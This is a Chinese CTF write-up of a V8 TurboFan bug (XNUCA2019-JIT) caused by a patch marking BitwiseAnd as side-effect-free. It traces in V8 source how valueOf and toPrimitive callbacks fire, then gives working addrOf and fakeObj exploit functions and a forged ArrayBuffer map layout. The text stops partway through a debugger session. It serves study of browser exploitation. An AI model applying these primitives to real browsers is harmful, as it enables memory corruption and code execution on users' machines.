> 原文链接: https://www.anquanke.com//post/id/205572 


# Browser Pwn XNUCA2019-JIT 分析与利用


                                阅读量   
                                **124987**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t016526bbb75fadd84b.png)](https://p1.ssl.qhimg.com/t016526bbb75fadd84b.png)



## Browser Pwn XNUCA2019-JIT 分析与利用

这是去年XNUCA初赛中的一道题，本文首先会从源码的角度来分析漏洞的成因，并且详细跟进了漏洞利用中回调函数触发的根源，最后通过两种不同的利用技巧来对该漏洞进行利用。

相关exp和patch文件[在这里](https://github.com/e3pem/CTF/tree/master/xnuca2019_jit)



## 环境搭建

在学习[P4nda师傅](http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/)关于`CVE-2018-17463`文章的时候，意识到该漏洞和这道题非常相似，所以本题的环境就直接在`CVE-2018-17463`上搭建了（与题目本身的环境不一致，但不影响我们学习该题分析和利用的方法）。

```
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=`pwd`/depot_tools:"$PATH"

git clone https://github.com/ninja-build/ninja.git
cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..
export PATH=`pwd`/ninja:"$PATH"

fetch v8
git checkout 568979f4d891bafec875fab20f608ff9392f4f29

# 手动把src/compiler/js-operator.cc中的
# V(BitwiseAnd, Operator::kNoProperties, 2, 1)改成
# V(BitwiseAnd, Operator::kNoWrite, 2, 1)

# debug version
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8

# release version
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```



## 漏洞分析

### <a class="reference-link" name="patch"></a>patch

这道题的patch非常简洁，只是把`BitwiseAnd`的属性从`kNoProperties`变成了`kNoWrite`。所以问题肯定出在对`BitwiseAnd`操作的误判，即认为该操作不存在可见的副作用，既然这个推断有问题，那么副作用到底出现在什么地方呢？下面将从源码的角度来寻找副作用！

```
diff --git a/src/compiler/js-operator.cc b/src/compiler/js-operator.cc
index 5337ae3bda..f5cf34bb3b 100644
--- a/src/compiler/js-operator.cc
+++ b/src/compiler/js-operator.cc
@@ -597,7 +597,7 @@ CompareOperationHint CompareOperationHintOf(const Operator* op) `{`
 #define CACHED_OP_LIST(V)                                                
   V(BitwiseOr, Operator::kNoProperties, 2, 1)                            
   V(BitwiseXor, Operator::kNoProperties, 2, 1)                           
-  V(BitwiseAnd, Operator::kNoProperties, 2, 1)                           
+  V(BitwiseAnd, Operator::kNoWrite, 2, 1)                           
   V(ShiftLeft, Operator::kNoProperties, 2, 1)                            
   V(ShiftRight, Operator::kNoProperties, 2, 1)                           
   V(ShiftRightLogical, Operator::kNoProperties, 2, 1)
```

### <a class="reference-link" name="%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"></a>寻找漏洞触发点

直接全局搜索`BitwiseAnd`字符串便可找到所有可能操作该节点的地方。注意到在`srccompilerjs-generic-lowering.cc`中有对该字符串的操作，对于为什么会关注这里，主要是因为这是Turbofan对`sea of nodes`处理的一个阶段，Turbofan在对代码进行优化编译的时候主要就是经过多个阶段对节点的分析处理来得到更加底层的操作代码。

经过处理后，`BitwiseAnd`节点被替换成了`Builtins::k##Name`的Builtins调用，也既`Builtins::kBitwiseAnd`。

```
// srccompilerjs-generic-lowering.cc
#define REPLACE_STUB_CALL(Name)                                              
  void JSGenericLowering::LowerJS##Name(Node* node) `{`                        
    CallDescriptor::Flags flags = FrameStateFlagForCall(node);               
    Callable callable = Builtins::CallableFor(isolate(), Builtins::k##Name); 
    ReplaceWithStubCall(node, callable, flags);                              
  `}`
REPLACE_STUB_CALL(BitwiseAnd)
```

`Builtins::kBitwiseAnd`定义在`srcbuiltinsbuiltins-number-gen.cc`中，主要逻辑就是获取`BitwiseAnd`节点的左右两个`操作数`，利用`TaggedToWord32OrBigInt`判断操作数是正常的数还是`BigInt`，如果左右操作数都不是大整数，就会调用`BitwiseOp`来进行处理，否则就会调用`Runtime::kBigIntBinaryOp`的runtime函数。

```
// srcbuiltinsbuiltins-number-gen.cc
TF_BUILTIN(BitwiseAnd, NumberBuiltinsAssembler) `{`
  EmitBitwiseOp&lt;Descriptor&gt;(Operation::kBitwiseAnd);
`}`

  template &lt;typename Descriptor&gt;
  void EmitBitwiseOp(Operation op) `{`
    // 要调试的话可以加入：
    // DebugBreak();
    Node* left = Parameter(Descriptor::kLeft);
    Node* right = Parameter(Descriptor::kRight);
    Node* context = Parameter(Descriptor::kContext);

    VARIABLE(var_left_word32, MachineRepresentation::kWord32);
    VARIABLE(var_right_word32, MachineRepresentation::kWord32);
    VARIABLE(var_left_bigint, MachineRepresentation::kTagged, left);
    VARIABLE(var_right_bigint, MachineRepresentation::kTagged);
    Label if_left_number(this), do_number_op(this);
    Label if_left_bigint(this), do_bigint_op(this);

    TaggedToWord32OrBigInt(context, left, &amp;if_left_number, &amp;var_left_word32,
                           &amp;if_left_bigint, &amp;var_left_bigint);
    BIND(&amp;if_left_number);
    TaggedToWord32OrBigInt(context, right, &amp;do_number_op, &amp;var_right_word32,
                           &amp;do_bigint_op, &amp;var_right_bigint);
    BIND(&amp;do_number_op);
    Return(BitwiseOp(var_left_word32.value(), var_right_word32.value(), op));

    // BigInt cases.
    BIND(&amp;if_left_bigint);
    TaggedToNumeric(context, right, &amp;do_bigint_op, &amp;var_right_bigint);

    BIND(&amp;do_bigint_op);
    Return(CallRuntime(Runtime::kBigIntBinaryOp, context,
                       var_left_bigint.value(), var_right_bigint.value(),
                       SmiConstant(op)));
  `}`
```

一开始的分析方向主要是放在`BitwiseAnd`节点对两个操作数的改变上，但是我结合实际调试以及源码分析，没有找到哪个地方对操作数进行了改变，感兴趣的可以查看一下相关代码，由于篇幅原因，这里我只分析存在漏洞的地方，也就是`TaggedToWord32OrBigInt`函数中的内容。

跟进`TaggedToWord32OrBigInt`函数，函数又调用了`TaggedToWord32OrBigIntImpl`，`TaggedToWord32OrBigIntImpl`主要的逻辑是一个循环，会判断参数`value`节点的类型是不是小整数Smi，不是的话就会依据其map来看value的类型，例如是不是HeapNumber、BigInt。如果都不是，那么会看value的`instance_type`是不是`ODDBALL_TYPE`，如果仍然不是，那么就会依据`conversion`的类型来调用相应的Builtins函数，这里`conversion`的类型为`Object::Conversion::kToNumeric`，因此会调用`Builtins::NonNumberToNumeric`函数，这就是问题所在了！！

```
// srccode-stub-assembler.cc
void CodeStubAssembler::TaggedToWord32OrBigInt(Node* context, Node* value,
                                               Label* if_number,
                                               Variable* var_word32,
                                               Label* if_bigint,
                                               Variable* var_bigint) `{`
  TaggedToWord32OrBigIntImpl&lt;Object::Conversion::kToNumeric&gt;(
      context, value, if_number, var_word32, if_bigint, var_bigint);
`}`

template &lt;Object::Conversion conversion&gt;
void CodeStubAssembler::TaggedToWord32OrBigIntImpl(
    Node* context, Node* value, Label* if_number, Variable* var_word32,
    Label* if_bigint, Variable* var_bigint, Variable* var_feedback) `{`

  ...
  // We might need to loop after conversion.
  VARIABLE(var_value, MachineRepresentation::kTagged, value);
  OverwriteFeedback(var_feedback, BinaryOperationFeedback::kNone);
  Variable* loop_vars[] = `{`&amp;var_value, var_feedback`}`;
  int num_vars =
      var_feedback != nullptr ? arraysize(loop_vars) : arraysize(loop_vars) - 1;
  Label loop(this, num_vars, loop_vars);
  Goto(&amp;loop);
  BIND(&amp;loop);
  `{`
    // 取操作数的值
    value = var_value.value();
    Label not_smi(this), is_heap_number(this), is_oddball(this),
        is_bigint(this);
    //判断操作数是不是小整数Smi
    GotoIf(TaggedIsNotSmi(value), &amp;not_smi);

    // 如果是小整数，进入到if_number的处理分支
    // `{`value`}` is a Smi.
    var_word32-&gt;Bind(SmiToInt32(value));
    CombineFeedback(var_feedback, BinaryOperationFeedback::kSignedSmall);
    Goto(if_number);

    // 如果不是Smi，那么加载value对象的map，依据map来判断是不是HeapNumber
    BIND(&amp;not_smi);
    Node* map = LoadMap(value);
    GotoIf(IsHeapNumberMap(map), &amp;is_heap_number);
    // 如果不是HeapNumber，从map中获取实例的类型InstanceType
    Node* instance_type = LoadMapInstanceType(map);
    if (conversion == Object::Conversion::kToNumeric) `{`
        // 如果instance_type是BigInt
      GotoIf(IsBigIntInstanceType(instance_type), &amp;is_bigint);
    `}`

    // Not HeapNumber (or BigInt if conversion == kToNumeric).
    // 既不是HeapNumber也不是BigInt
    `{`
      if (var_feedback != nullptr) `{`
        // We do not require an Or with earlier feedback here because once we
        // convert the value to a Numeric, we cannot reach this path. We can
        // only reach this path on the first pass when the feedback is kNone.
        CSA_ASSERT(this, SmiEqual(CAST(var_feedback-&gt;value()),
                                  SmiConstant(BinaryOperationFeedback::kNone)));
      `}`
    //  判断instance_type是不是ODDBALL_TYPE
      GotoIf(InstanceTypeEqual(instance_type, ODDBALL_TYPE), &amp;is_oddball);
      // Not an oddball either -&gt; convert.
    //   不是ODDBALL_TYPE，依据conversion的类型调用相应的Builtin函数，conversion的类型为Object::Conversion::kToNumeric
      auto builtin = conversion == Object::Conversion::kToNumeric
                         ? Builtins::kNonNumberToNumeric
                         : Builtins::kNonNumberToNumber;
      var_value.Bind(CallBuiltin(builtin, context, value));
      OverwriteFeedback(var_feedback, BinaryOperationFeedback::kAny);
      Goto(&amp;loop);

      BIND(&amp;is_oddball);
      var_value.Bind(LoadObjectField(value, Oddball::kToNumberOffset));
      OverwriteFeedback(var_feedback,
                        BinaryOperationFeedback::kNumberOrOddball);
      Goto(&amp;loop);
    `}`

    BIND(&amp;is_heap_number);
    var_word32-&gt;Bind(TruncateHeapNumberValueToWord32(value));
    CombineFeedback(var_feedback, BinaryOperationFeedback::kNumber);
    Goto(if_number);

    if (conversion == Object::Conversion::kToNumeric) `{`
      BIND(&amp;is_bigint);
      var_bigint-&gt;Bind(value);
      CombineFeedback(var_feedback, BinaryOperationFeedback::kBigInt);
      Goto(if_bigint);
    `}`
  `}`
`}`
```

看到这里的`kNonNumberToNumeric`，让我想起了[数字经济线下赛](https://xz.aliyun.com/t/6577)的Browser Pwn，那道题利用的就是`ToNumber`函数在调用的时候会触发`valueOf`的回调函数，这道题是否也会触发相应的回调函数呢？在我测试后发现果然是这样！！也就是说我们找到了漏洞存在的地方，`a&amp;b`将生成一个`BitwiseAnd`节点，该节点被判定为`NoWrite`，实际情况却是在对`BitwiseAnd`节点的输入操作数进行处理的时候会触发操作数中的`valueOf`回调函数，所以认为该节点是`NoWrite`是有问题的。

```
function opt_me(a,b)`{`
    let c = 1.0
    c = c+3;
    a&amp;b;
    return c;
`}`
let b = `{`
    valueOf:function()`{`
        return 112233;
    `}`
`}`
let b1 = `{`
    valueOf:function()`{`
        print('callback');
        return 223344;
    `}`
`}`
opt_me(1234,b);
opt_me(1234,b);
%OptimizeFunctionOnNextCall(opt_me);
opt_me(2345,b1);
// output: callback
```

### <a class="reference-link" name="%E6%8E%A2%E5%AF%BB%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0-toPrimitive"></a>探寻回调函数-toPrimitive

虽然已经找到了触发漏洞的方式，但是我们的分析不能到此为止，接下来的目标是尝试跟踪到具体调用回调函数的地方。继续分析`Builtins::NonNumberToNumeric`，该函数获取节点的context和input，并将其作为`NonNumberToNumeric`的参数。`NonNumberToNumeric`内部又调用了`NonNumberToNumberOrNumeric`函数。

```
// srcbuiltinsbuiltins-conversion-gen.cc
TF_BUILTIN(NonNumberToNumeric, CodeStubAssembler) `{`
  Node* context = Parameter(Descriptor::kContext);
  Node* input = Parameter(Descriptor::kArgument);

  Return(NonNumberToNumeric(context, input));
`}`

// srccode-stub-assembler.cc
TNode&lt;Numeric&gt; CodeStubAssembler::NonNumberToNumeric(
    SloppyTNode&lt;Context&gt; context, SloppyTNode&lt;HeapObject&gt; input) `{`
  Node* result = NonNumberToNumberOrNumeric(context, input,
                                            Object::Conversion::kToNumeric);
  CSA_SLOW_ASSERT(this, IsNumeric(result));
  return UncheckedCast&lt;Numeric&gt;(result);
`}`
```

`NonNumberToNumberOrNumeric`函数的主要逻辑也是一个大循环，在循环里面对input的`instance_type`进行判断，判断是否是String、BigInt、ODDBALL_TYPE、JSReceiver等，然后跳转到相应的分支处去执行。如果是String，就调用`StringToNumber`把字符串转换为Number。我们要关注的是`if_inputisreceiver`这个分支，该分支会调用`NonPrimitiveToPrimitive`来把input转换为更原始的数据，如果转换结果是一个`Number/Numeric`，说明转换完成退出循环，否则继续循环。

```
// srccode-stub-assembler.cc
Node* CodeStubAssembler::NonNumberToNumberOrNumeric(
    Node* context, Node* input, Object::Conversion mode,
    BigIntHandling bigint_handling) `{`

    ...
  // We might need to loop once here due to ToPrimitive conversions.
  VARIABLE(var_input, MachineRepresentation::kTagged, input);
  VARIABLE(var_result, MachineRepresentation::kTagged);
  Label loop(this, &amp;var_input);
  Label end(this);
  Goto(&amp;loop);
  BIND(&amp;loop);
  `{`
    // Load the current `{`input`}` value (known to be a HeapObject).
    Node* input = var_input.value();

    // 获取input的instancetype
    // Dispatch on the `{`input`}` instance type.
    Node* input_instance_type = LoadInstanceType(input);
    // 定义多个标签，每个标签对应一个跳转分支
    Label if_inputisstring(this), if_inputisoddball(this),
        if_inputisbigint(this), if_inputisreceiver(this, Label::kDeferred),
        if_inputisother(this, Label::kDeferred);
    // 依次判断instance_type是不是String、BigInt、ODDBALL_TYPE、JSReceiver等，并跳转到相应的分支继续执行
    GotoIf(IsStringInstanceType(input_instance_type), &amp;if_inputisstring);
    GotoIf(IsBigIntInstanceType(input_instance_type), &amp;if_inputisbigint);
    GotoIf(InstanceTypeEqual(input_instance_type, ODDBALL_TYPE),
           &amp;if_inputisoddball);
    Branch(IsJSReceiverInstanceType(input_instance_type), &amp;if_inputisreceiver,
           &amp;if_inputisother);

    // 如果是字符串
    BIND(&amp;if_inputisstring);
    `{`
      // The `{`input`}` is a String, use the fast stub to convert it to a Number.
      TNode&lt;String&gt; string_input = CAST(input);
      var_result.Bind(StringToNumber(string_input));
      Goto(&amp;end);
    `}`
    // 如果是BigInt
    BIND(&amp;if_inputisbigint);
    ...

    // 是ODDBALL_TYPE
    BIND(&amp;if_inputisoddball);
    `{`
      ...
    `}`

    // 是JSReceiver
    BIND(&amp;if_inputisreceiver);
    `{`
      // The `{`input`}` is a JSReceiver, we need to convert it to a Primitive first
      // using the ToPrimitive type conversion, preferably yielding a Number.
      // 调用NonPrimitiveToPrimitive来把input转换为更原始的数据
      Callable callable = CodeFactory::NonPrimitiveToPrimitive(
          isolate(), ToPrimitiveHint::kNumber);
      Node* result = CallStub(callable, context, input);

      // Check if the `{`result`}` is already a Number/Numeric.
      //检查结果是Number还是Numeric
      Label if_done(this), if_notdone(this);
      Branch(mode == Object::Conversion::kToNumber ? IsNumber(result)
                                                   : IsNumeric(result),
             &amp;if_done, &amp;if_notdone);

      BIND(&amp;if_done);
      `{`
        // The ToPrimitive conversion already gave us a Number/Numeric, so we're
        // done.
        // 通过ToPrimitive的转换，已经得到了一个Number/Numeric，退出循环
        var_result.Bind(result);
        Goto(&amp;end);
      `}`

      BIND(&amp;if_notdone);
      `{`
        // We now have a Primitive `{`result`}`, but it's not yet a Number/Numeric.
        // 得到了更原始的结果，但是仍然不是Number/Numeric，继续循环。
        var_input.Bind(result);
        Goto(&amp;loop);
      `}`
    `}`

    // other
    BIND(&amp;if_inputisother);
    `{`
      ...
    `}`
  `}`
  ...
  return var_result.value();
`}`
```

`NonPrimitiveToPrimitive`内部调用了`Builtins`函数`NonPrimitiveToPrimitive`，依据hint的类型调用相应的处理函数。这里的hint是`kNumber`，因此调用的是`NonPrimitiveToPrimitive_Number`函数，函数内部也仅仅是调用`Generate_NonPrimitiveToPrimitive`来进一步对参数进行处理。

```
// srccode-factory.cc
Callable CodeFactory::NonPrimitiveToPrimitive(Isolate* isolate,
                                              ToPrimitiveHint hint) `{`
  return Callable(isolate-&gt;builtins()-&gt;NonPrimitiveToPrimitive(hint),
                  TypeConversionDescriptor`{``}`);
`}`

// srcbuiltinsbuiltins.cc
Handle&lt;Code&gt; Builtins::NonPrimitiveToPrimitive(ToPrimitiveHint hint) `{`
  switch (hint) `{`
    case ToPrimitiveHint::kDefault:
      return builtin_handle(kNonPrimitiveToPrimitive_Default);
    case ToPrimitiveHint::kNumber:
      return builtin_handle(kNonPrimitiveToPrimitive_Number); // here
    case ToPrimitiveHint::kString:
      return builtin_handle(kNonPrimitiveToPrimitive_String);
  `}`
  UNREACHABLE();
`}`

// srcbuiltinsbuiltins-conversion-gen.cc
TF_BUILTIN(NonPrimitiveToPrimitive_Number, ConversionBuiltinsAssembler) `{`
  Node* context = Parameter(Descriptor::kContext);
  Node* input = Parameter(Descriptor::kArgument);

  Generate_NonPrimitiveToPrimitive(context, input, ToPrimitiveHint::kNumber);
`}`
```

`Generate_NonPrimitiveToPrimitive`函数内部会查找input的`@[@toPrimitive](https://github.com/toPrimitive)`属性，如果存在相关属性便会通过`CallJS`来调用我们的`@[@toPrimitive](https://github.com/toPrimitive)`属性`exotic_to_prim`，那这个toPrimitive到底是个什么呢？查了一下发现这个属性是我们可以定义的，也就是说这个地方是我们可以设置的回调函数！！！

```
Symbol.toPrimitive 是一个内置的 Symbol 值，它是作为对象的函数值属性存在的，当一个对象转换为对应的原始值时，会调用此函数。
```

```
// srcbuiltinsbuiltins-conversion-gen.cc
// ES6 section 7.1.1 ToPrimitive ( input [ , PreferredType ] )
void ConversionBuiltinsAssembler::Generate_NonPrimitiveToPrimitive(
    Node* context, Node* input, ToPrimitiveHint hint) `{`
  // Lookup the @@toPrimitive property on the `{`input`}`.
  Node* exotic_to_prim =
      GetProperty(context, input, factory()-&gt;to_primitive_symbol());

  // Check if `{`exotic_to_prim`}` is neither null nor undefined.
  // 检查exotic_to_prim，若既不是null也不是undefined
  Label ordinary_to_primitive(this);
  GotoIf(IsNullOrUndefined(exotic_to_prim), &amp;ordinary_to_primitive);
  `{`
    // Invoke the `{`exotic_to_prim`}` method on the `{`input`}` with a string
    // representation of the `{`hint`}`.
    Callable callable =
        CodeFactory::Call(isolate(), ConvertReceiverMode::kNotNullOrUndefined);
    Node* hint_string = HeapConstant(factory()-&gt;ToPrimitiveHintString(hint));
    // calljs调用exotic_to_prim
    Node* result =
        CallJS(callable, context, exotic_to_prim, input, hint_string);
    //判断结果是否是一个原始值
    // Verify that the `{`result`}` is actually a primitive.
    Label if_resultisprimitive(this),
        if_resultisnotprimitive(this, Label::kDeferred);
    GotoIf(TaggedIsSmi(result), &amp;if_resultisprimitive);
    Node* result_instance_type = LoadInstanceType(result);
    Branch(IsPrimitiveInstanceType(result_instance_type), &amp;if_resultisprimitive,
           &amp;if_resultisnotprimitive);

    BIND(&amp;if_resultisprimitive);
    `{`
      // Just return the `{`result`}`.
      Return(result);
    `}`

    BIND(&amp;if_resultisnotprimitive);
    `{`
      // Somehow the @@toPrimitive method on `{`input`}` didn't yield a primitive.
      ThrowTypeError(context, MessageTemplate::kCannotConvertToPrimitive);
    `}`
  `}`

  // Convert using the OrdinaryToPrimitive algorithm instead.
  BIND(&amp;ordinary_to_primitive);
  `{`
    Callable callable = CodeFactory::OrdinaryToPrimitive(
        isolate(), (hint == ToPrimitiveHint::kString)
                       ? OrdinaryToPrimitiveHint::kString
                       : OrdinaryToPrimitiveHint::kNumber);
    TailCallStub(callable, context, input);
  `}`
`}`
```

所以按照上面的分析，我们可以设置对象的`toPrimitive`属性，然后在处理过程中会调用该属性对应的回调函数，如下所示：

```
let b = `{`
    [Symbol.toPrimitive](hint) `{`
        return 112233;
    `}`
`}`
let b1 = `{`
    [Symbol.toPrimitive](hint) `{`
        print('callback');
        return 112233;
    `}`
`}`
opt_me(1234,b);
opt_me(1234,b);
%OptimizeFunctionOnNextCall(opt_me);
opt_me(2345,b1);
// output： callback
```

### <a class="reference-link" name="%E6%8E%A2%E5%AF%BB%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0-valueOf"></a>探寻回调函数-valueOf

通过前面的分析我们找到了一处回调函数调用的地方`toPrimitive`属性，这已经可以用来进行漏洞利用了，但是还是没有找到最开始发现的`valueOf`回调函数调用的地方，所以还要继续分析！

我们开始定义的包含`valueOf`的对象没有定义相应的`toPrimitive`属性，所以在`Generate_NonPrimitiveToPrimitive`中它应该会跳转到`ordinary_to_primitive`分支处执行，也就是会调用`OrdinaryToPrimitive`函数。这个函数的逻辑和前面分析的很相似，最后会跳转到`Generate_OrdinaryToPrimitive`函数中执行。

```
// srccode-factory.cc
// static
Callable CodeFactory::OrdinaryToPrimitive(Isolate* isolate,
                                          OrdinaryToPrimitiveHint hint) `{`
  return Callable(isolate-&gt;builtins()-&gt;OrdinaryToPrimitive(hint),
                  TypeConversionDescriptor`{``}`);
`}`

// srcbuiltinsbuiltins.cc
Handle&lt;Code&gt; Builtins::OrdinaryToPrimitive(OrdinaryToPrimitiveHint hint) `{`
  switch (hint) `{`
    case OrdinaryToPrimitiveHint::kNumber:
      return builtin_handle(kOrdinaryToPrimitive_Number);
    case OrdinaryToPrimitiveHint::kString:
      return builtin_handle(kOrdinaryToPrimitive_String);
  `}`
  UNREACHABLE();
`}`

// srcbuiltinsbuiltins-conversion-gen.cc
TF_BUILTIN(OrdinaryToPrimitive_Number, ConversionBuiltinsAssembler) `{`
  Node* context = Parameter(Descriptor::kContext);
  Node* input = Parameter(Descriptor::kArgument);
  Generate_OrdinaryToPrimitive(context, input,
                               OrdinaryToPrimitiveHint::kNumber);
`}`
```

`Generate_OrdinaryToPrimitive`函数中终于出现了我们所期望的内容，该函数依据hint的值来设置`method_names`变量中的内容，主要是`valueOf`和`toString`。然后会尝试从input中获取`valueOf/toString`属性，如果获取到的属性是`callable`，那么就调用它，所以我们定义的valueOf属性对应的回调函数会被调用，至此源码分析结束！

```
// srcbuiltinsbuiltins-conversion-gen.cc
// 7.1.1.1 OrdinaryToPrimitive ( O, hint )
void ConversionBuiltinsAssembler::Generate_OrdinaryToPrimitive(
    Node* context, Node* input, OrdinaryToPrimitiveHint hint) `{`
  VARIABLE(var_result, MachineRepresentation::kTagged);
  Label return_result(this, &amp;var_result);
  // 依据hint来设置method_names
  Handle&lt;String&gt; method_names[2];
  switch (hint) `{`
    case OrdinaryToPrimitiveHint::kNumber:
      method_names[0] = factory()-&gt;valueOf_string();
      method_names[1] = factory()-&gt;toString_string();
      break;
    case OrdinaryToPrimitiveHint::kString:
      method_names[0] = factory()-&gt;toString_string();
      method_names[1] = factory()-&gt;valueOf_string();
      break;
  `}`
  // 遍历method_names，依据method_name来获取input中对应的属性
  for (Handle&lt;String&gt; name : method_names) `{`
    // Lookup the `{`name`}` on the `{`input`}`.
    Node* method = GetProperty(context, input, name);

    // Check if the `{`method`}` is callable.
    // 检查获取到的method是否是callable
    Label if_methodiscallable(this),
        if_methodisnotcallable(this, Label::kDeferred);
    GotoIf(TaggedIsSmi(method), &amp;if_methodisnotcallable);
    Node* method_map = LoadMap(method);
    Branch(IsCallableMap(method_map), &amp;if_methodiscallable,
           &amp;if_methodisnotcallable);

    // 通过CallJS来调用我们的回调函数
    BIND(&amp;if_methodiscallable);
    `{`
      // Call the `{`method`}` on the `{`input`}`.
      Callable callable = CodeFactory::Call(
          isolate(), ConvertReceiverMode::kNotNullOrUndefined);
      Node* result = CallJS(callable, context, method, input);
      var_result.Bind(result);

      // Return the `{`result`}` if it is a primitive.
      GotoIf(TaggedIsSmi(result), &amp;return_result);
      Node* result_instance_type = LoadInstanceType(result);
      GotoIf(IsPrimitiveInstanceType(result_instance_type), &amp;return_result);
    `}`

    // Just continue with the next `{`name`}` if the `{`method`}` is not callable.
    Goto(&amp;if_methodisnotcallable);
    BIND(&amp;if_methodisnotcallable);
  `}`

  ThrowTypeError(context, MessageTemplate::kCannotConvertToPrimitive);

  BIND(&amp;return_result);
  Return(var_result.value());
`}`
```

### <a class="reference-link" name="%E5%B0%8F%E7%BB%93"></a>小结

本节以patch文件为切入点，从源码的角度分析了漏洞存在的地方，结合`数字经济线下赛`的解题思路找到了触发漏洞的方式，然后以此探寻了回调函数最终被调用的根源，最终找到了三种定义回调函数的方法：
- Symbol.toPrimitive属性
- valueOf属性
- toString属性


## 漏洞利用 – Fake ArrayBuffer

该利用方法是从`Sakura`师傅写的[34c3 v9 writeup](http://eternalsakura13.com/2019/04/29/v9/)中学到的。最初我构造出addrOf和fakeObj之后被卡了很久，主要就是拿不到一个合法的map，从师傅的文章里面了解到伪造`ArrayBuffer map`并进一步伪造出`ArrayBuffer`是可行的。

### <a class="reference-link" name="addrOf%E5%8E%9F%E8%AF%AD"></a>addrOf原语

利用Turbofan对`BitwiseAnd`节点影响的误判，我们可以消除掉对象属性访问的`CheckMaps`节点，进而造成类型混淆。例如定义`let c = `{`x:1.2,y:1.3`}`;`，在两次属性访问`c.x`和`c.y`之间插入`a&amp;b`操作，c.y的`ChekMaps`节点仍会被消除，如果在回调函数中把`c.y`赋值为一个对象，那么`return c.y;`仍然会按照之前的类型`double`来返回数据，实现对象的地址信息泄露。由于正常写addrOf原语每调用一次之后就得重新写一个新的addrOf函数，因此我在`addrOf`中加入了部分动态生成的代码片段，如下所示：

```
function getObj(idx)`{`
        let c = 2.2;
        eval(`c = `{`x:1.2,$`{`'y'+idx`}`:2.2`}`;`);
        return c;
    `}`
    function addrOf(obj,cid)`{`
        eval(`
            function vulfunc4leak(a,b,c)`{`
                let d = 1.2;
                d = c.x+d;
                a&amp;b;
                return c.$`{`'y'+cid`}`;
            `}`
            `);
        let b0 = `{`
            valueOf: function()`{`
                return 22223333;
            `}`
        `}`
        let b = `{`
            valueOf: function()`{`
                eval(`c.$`{`'y'+cid`}` = obj;`);
                return 888888889999;
            `}`
        `}`
        var c = getObj(cid);
        for(let i=0;i&lt;OPT_NUM;++i)`{`
            vulfunc4leak(12345,b0,c);
        `}`
        let ret = vulfunc4leak(12345,b,c);
        return ret;
    `}`
```

### <a class="reference-link" name="fakeObj%E5%8E%9F%E8%AF%AD"></a>fakeObj原语

fakeObj原语的实现和addrOf类似，只需要第二次对属性的访问`o.y1`是写操作即可，我们在回调函数中先把`o.y1`赋值为一个对象，后续的写操作由于消掉了`CheckMaps`节点仍会以double类型的方式往`o.y1`写入数据，执行完后返回的`o.y1`会按照对象来解析。因此我们可以指定任意的地址，该地址将作为对象被返回，实现fakeObj。

```
function fakeObj(addr)`{`
        function vulfunc4fake(a,b,o,value)`{`
            for(let i=0;i&lt;OPT_NUM;++i)`{``}`
            o.x1;
            a&amp;b;
            o.y1 = value;
            return o.x1;
        `}`
        let a1 = 11112222;
        let b2 = `{`
            valueOf: function()`{`
                return 11112333;
            `}`
        `}`
        let obj4 = new ArrayBuffer(0x30);
        let o = `{`x1:1.1,y1:1.2`}`;
        let b3 = `{`
            valueOf: function()`{`
                o.y1 = obj4;
                return 888888887777;
            `}`
        `}`
        vulfunc4fake(a1,b2,o,1.3);
        vulfunc4fake(a1,b2,o,1.3);
        let ret = vulfunc4fake(a1,b3,o,addr);
        return o.y1;
    `}`
```

### <a class="reference-link" name="%E4%BC%AA%E9%80%A0ArrayBuffer%20map"></a>伪造ArrayBuffer map

有了addrOf可以泄露对象的地址，利用fakeObj可以伪造对象，但是面临的一个问题就是每个对象都有map字段，若是不能得到一个正确合法的map，我们的对象是不能被正常解析的。实现任意地址读写一个很直观的思路就是伪造ArrayBuffer对象，控制`backing_store`字段即可任意地址读写，前提是得先伪造`ArrayBuffer map`。

伪造map只需要按照下面这个形式来伪造就行了：

```
var ab_map_obj = [
    -1.1263976280432204e+129,   //0xdaba0000daba0000，写死即可，这个数字应该无所谓
    2.8757499612354866e-188,     //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可
    6.7349004654127717e-316,     //这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可
    -1.1263976280432204e+129,   // use prototype replace it
    -1.1263976280432204e+129,   // use constructor replace it
    0.0
];
```

我们需要关注map对象的两个字段，`prototype`和`constructor`，其中`prototype`的地址可以通过`addrOf(ab.__proto__)`来获取，而`constructor`的地址和`prototype`的偏移是固定的(这里是0x1A0)，因此可以算出constructor的地址。随便打印一个实际ArrayBuffer的map对象：

```
0x55fbd984371: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 64
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x0a8b573825a1 &lt;undefined&gt;
 - prototype_validity cell: 0x3291ad202201 &lt;Cell value= 1&gt;
 - instance descriptors (own) #0: 0x0a8b57382321 &lt;DescriptorArray[2]&gt;
 - layout descriptor: (nil)
 - prototype: 0x3fb82f110fd1 &lt;Object map = 0x55fbd9843c1&gt;
 - constructor: 0x3fb82f110e31 &lt;JSFunction ArrayBuffer (sfi = 0x3291ad216e41)&gt;
 - dependent code: 0x0a8b57382391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0

pwndbg&gt; x/20xg 0x55fbd984370
0x55fbd984370:  0x00000a8b57382251      0x1900042313080808
0x55fbd984380:  0x00000000082003ff      0x00003fb82f110fd1
0x55fbd984390:  0x00003fb82f110e31      0x0000000000000000
0x55fbd9843a0:  0x00000a8b57382321      0x0000000000000000
0x55fbd9843b0:  0x00000a8b57382391      0x00003291ad202201
pwndbg&gt; p `{`double`}` 0x55fbd984378
